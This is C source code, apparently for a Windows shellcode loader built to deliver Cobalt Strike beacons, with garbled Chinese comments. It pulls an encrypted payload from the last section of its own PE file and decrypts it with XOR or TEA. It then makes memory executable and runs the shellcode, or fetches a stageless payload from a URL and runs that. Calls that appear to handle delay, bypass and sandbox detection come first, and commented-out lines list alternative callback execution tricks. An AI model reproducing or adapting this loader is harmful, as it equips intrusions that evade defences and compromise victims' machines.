#include"bypass.h"
#include"stage.h"
#include <tlhelp32.h>
#include <Psapi.h>
#pragma comment(lib, "Crypt32.lib")
//#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")//����ʾ����
#pragma comment(linker,"/MERGE:.rdata=.text /MERGE:.data=.text /SECTION:.text,EWR")//�ϲ�����

typedef void(*void_func_ptr)(void);

unsigned char jmp32bitOffset[] = {
    0xe9                                // jmp <32-bit immediate_offset>
};

#define	MagicValue			WORD

struct ConfigurationData {
	unsigned char*		shellcode;
	DWORD				shellcodeSize;
	IMAGE_DOS_HEADER	mDosHeader;
	MagicValue			wMagic;
	IMAGE_NT_HEADERS32	mNtHeader;
};

/*****���ݰ���װ
* |STu8		|STu32			|STu8*		|
* |��������	|�������ݳ���	|��������	|
******/

//��������
#define H_ENC_XOR	(unsigned char)(0xB1)
#define H_ENC_AES	(unsigned char)(0xB2)
#define H_ENC_RC4	(unsigned char)(0xB3)
#define H_ENC_TEA	(unsigned char)(0xB4)

/*****�������ݷ�װ
* |STu8		|STu32			|STu8*		|
* |��������	|���ݳ���		|payload����|
******/

//payload��������
#define P_TYPE_STAGE		(unsigned char)(0xA0)
#define P_TYPE_STAGELESSURL	(unsigned char)(0xA1)

/*****stage payload
* Conbalt strike����ľ��ʽ���ɵĽ׶�һľ��
******/

/*****stageless url
* Conbalt strike����ľ��ʽ���ɵĽ׶ζ�ľ��url
* ���ݽ׶�һľ���������
******/


//tea����
void decrypt_tea(unsigned long* in, unsigned long* key, unsigned long* out)
{

	unsigned long code[4];
	register unsigned long n = 0x10, sum, y, z, delta = 0xab451fc4;

	sum = delta * n;
	y = htonl(in[0]);
	z = htonl(in[1]);

	code[0] = htonl(key[0]); code[1] = htonl(key[1]);
	code[2] = htonl(key[2]); code[3] = htonl(key[3]);

	while (n-- > 0)
	{
		z -= ((y >> 5) + code[3]) ^ ((y << 4) + code[2]) ^ (sum + y);
		y -= ((z >> 5) + code[1]) ^ ((z << 4) + code[0]) ^ (sum + z);
		sum -= delta;
	}
	out[0] = htonl(y);
	out[1] = htonl(z);
}

//�Զ�������㷨
void tea_decrypt(unsigned char* in, unsigned int inlen, unsigned char* key, unsigned char** out, unsigned int* outlen)
{
	unsigned char q[8], mkey[8], * q1, * q2, * outp;
	register int count, i, j, p;

	if (inlen % 8 || inlen < 16) return;
	/* get basic information of the packet */
	decrypt_tea((unsigned long*)in, (unsigned long*)key, (unsigned long*)q);
	j = q[0] & 0x7;
	count = inlen - j - 10;
	*outlen = count;
	*out = (unsigned char*)malloc(*outlen);
	if (*out == NULL) return;
	memset(*out, 0, *outlen);


	if (count < 0) return;

	memset(mkey, 0, 8);
	q2 = mkey;
	i = 8; p = 1;
	q1 = in + 8;
	j++;
	while (p <= 2)
	{
		if (j < 8)
		{
			j++;
			p++;
		}
		else if (j == 8)
		{
			q2 = in;
			for (j = 0; j < 8; j++)
			{
				if (i + j >= inlen) return;
				q[j] ^= q1[j];
			}
			decrypt_tea((unsigned long*)q, (unsigned long*)key,
				(unsigned long*)q);
			i += 8;
			q1 += 8;
			j = 0;
		}
	}
	outp = *out;
	while (count != 0)
	{
		if (j < 8)
		{
			outp[0] = q2[j] ^ q[j];
			outp++;
			count--;
			j++;
		}
		else if (j == 8)
		{
			q2 = q1 - 8;
			for (j = 0; j < 8; j++)
			{
				if (i + j >= inlen)
					return;
				q[j] ^= q1[j];
			}
			decrypt_tea((unsigned long*)q, (unsigned long*)key,
				(unsigned long*)q);
			i += 8;
			q1 += 8;
			j = 0;
		}
	}
	for (p = 1; p < 8; p++)
	{
		if (j < 8)
		{
			if (q2[j] ^ q[j])
				return;
			j++;
		}
		else if (j == 8)
		{
			q2 = q1;
			for (j = 0; j < 8; j++)
			{
				if (i + j >= inlen)
					return;
				q[j] ^= q1[j];
			}
			decrypt_tea((unsigned long*)q, (unsigned long*)key,
				(unsigned long*)q);
			i += 8;
			q1 += 8;
			j = 0;
		}
	}
}

//��ȡ���̻���ַ
DWORD GetModuleBaseAddress(TCHAR* lpszModuleName, DWORD pID) { // Getting module base address
	DWORD dwModuleBaseAddress = 0;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pID);
	MODULEENTRY32 ModuleEntry32 = { 0 };
	ModuleEntry32.dwSize = sizeof(MODULEENTRY32);

	if (Module32First(hSnapshot, &ModuleEntry32))
	{
		do {
			if (strcmp(ModuleEntry32.szModule, lpszModuleName) == 0)
			{
				dwModuleBaseAddress = (DWORD)ModuleEntry32.modBaseAddr;
				break;
			}
		} while (Module32Next(hSnapshot, &ModuleEntry32));
	}
	CloseHandle(hSnapshot);
	return dwModuleBaseAddress;
}

int GetSCPointerFromPE(struct ConfigurationData* config,unsigned int *scPointer,unsigned int *scSize)
{
	//��ȡ��ǰ���̼��ػ�ַ
	char	fileName[100] = { 0 };
	char    processFullName[_MAX_PATH] = { 0 };
	char    processName[0x128] = { 0 };
	char* tmp1 = NULL;
	char* tmp2 = NULL;
	GetModuleFileNameA(NULL, processFullName, _MAX_PATH); //��������·��
	tmp1 = strrchr((char*)processFullName, '\\');
	memcpy(processName, tmp1 + 1, min(strlen(tmp1), sizeof(processName))); //��ȡ�ý�����
	DWORD   dwpid = GetCurrentProcessId();
	DWORD baseaddr = GetModuleBaseAddress(processName, dwpid);

	CopyMemory(&config->mDosHeader, (void*)baseaddr, sizeof(IMAGE_DOS_HEADER));
	//�ж�CPU�ֳ�
	DWORD dwVirtualAddress = config->mDosHeader.e_lfanew;
	dwVirtualAddress += sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER);
	CopyMemory(&config->wMagic, (void*)(baseaddr + dwVirtualAddress), sizeof(WORD));
	if (config->wMagic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) return -1;         //64λ�ݲ�֧��
	CopyMemory(&config->mNtHeader, (void*)(baseaddr + config->mDosHeader.e_lfanew), sizeof(IMAGE_NT_HEADERS32));
	//��������
	dwVirtualAddress = config->mDosHeader.e_lfanew;
	dwVirtualAddress += sizeof(IMAGE_NT_HEADERS32);
	dwVirtualAddress += sizeof(IMAGE_SECTION_HEADER) * (config->mNtHeader.FileHeader.NumberOfSections - 1);
	IMAGE_SECTION_HEADER mSectionHeader;
	CopyMemory(&mSectionHeader, (void*)(baseaddr + dwVirtualAddress), sizeof(IMAGE_SECTION_HEADER));
	
	*scPointer = baseaddr + mSectionHeader.VirtualAddress;
	*scSize = mSectionHeader.SizeOfRawData;

	return 0;
}

int DecryptSC(struct ConfigurationData* config,unsigned char *encData,unsigned int encDataSize)
{
	if (encData[0] == H_ENC_XOR)
	{
		config->shellcodeSize = *(unsigned int*)(encData + 1 + 16);
		config->shellcode = (unsigned char*)malloc(config->shellcodeSize);
		for (int i = 0; i < config->shellcodeSize; i++)
		{
			(encData + 1 + 16 + 4)[i] ^= (encData + 1)[i % 0x10];
		}
		if (config->shellcode != 0)
			memcpy(config->shellcode, encData + 1 + 16 + 4, config->shellcodeSize);
		else
			return -1;
	}
	else if (encData[0] == H_ENC_AES)
	{

	}
	else if (encData[0] == H_ENC_RC4)
	{

	}
	else if (encData[0] == H_ENC_TEA)
	{
		int encdatasize = *(unsigned int*)(encData + 1 + 16);
		//TEA����
		tea_decrypt((encData + 1 + 16 + 4), encdatasize, (encData + 1), &config->shellcode, (unsigned int*)&config->shellcodeSize);
		if (config->shellcode == NULL) {
			return -1;
		}
	}
	else
		return -1;

	return 0;
}

//��������shellcode
int RunSCFromPE(struct ConfigurationData* config)
{
	unsigned int encData = 0;
	unsigned int encDataSize = 0;
	//����PE�ṹ�������λ�ȡSC
	GetSCPointerFromPE(config, &encData, &encDataSize);
	//����SC
	if (DecryptSC(config, (unsigned char*)encData, encDataSize)==0)
	{
		if (config->shellcode[0] == P_TYPE_STAGE)
		{
			LPVOID dwBaseAddr = VirtualAlloc(0, config->shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
			if (dwBaseAddr)
			{
				//ȥ��ͷ��
				memcpy(dwBaseAddr, config->shellcode + 5, config->shellcodeSize - 5);
				free(config->shellcode);
				DWORD oldpro = PAGE_READWRITE;
				if (VirtualProtect(dwBaseAddr, config->shellcodeSize, PAGE_EXECUTE_READWRITE, &oldpro))
				{
					((void(*)())dwBaseAddr)();
					//ִ��shellcode����
					//void_func_ptr callLoc = (void_func_ptr)(dwBaseAddr);
					//callLoc();//�������ñ���
					//EnumWindows((WNDENUMPROC)(callLoc), 0); //�������ñ���
					//EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)callLoc, LGRPID_INSTALLED, NULL);//�������ñ���
					//CertEnumSystemStore(0x10000, 0, "system", (PFN_CERT_ENUM_SYSTEM_STORE)callLoc);//�������ñ���
				}
			}
		}
		else if (config->shellcode[0] == P_TYPE_STAGELESSURL)
		{
			unsigned int urllen = *(unsigned int*)(config->shellcode + 1);
			unsigned char* url = (unsigned char*)malloc(urllen + 1);
			if (url)
			{
				//����url
				memset(url, 0, urllen + 1);
				memcpy(url, config->shellcode + 1 + 4, urllen);
				GetStageless(url, &config->shellcode, (unsigned int *)&(config->shellcodeSize));
				free(url);
				LPVOID dwBaseAddr = VirtualAlloc(0, config->shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
				if (dwBaseAddr)
				{
					memcpy(dwBaseAddr, config->shellcode, config->shellcodeSize);
					free(config->shellcode);
					DWORD oldpro = PAGE_READWRITE;
					if (VirtualProtect(dwBaseAddr, config->shellcodeSize, PAGE_EXECUTE_READWRITE, &oldpro))
						((void(*)())dwBaseAddr)();
				}
			}
			else
				return -1;
		}
		return 0;
	}
	return -1;
}

int main()
{
	ForDelay();

	ForBD();
	
	struct ConfigurationData config;
	memset(&config, 0, sizeof(struct ConfigurationData));

	if (ForSD())
	{
		return 0;
	}
	if (RunSCFromPE(&config) < 0) {
		return 1;
	}
	return 0;
}

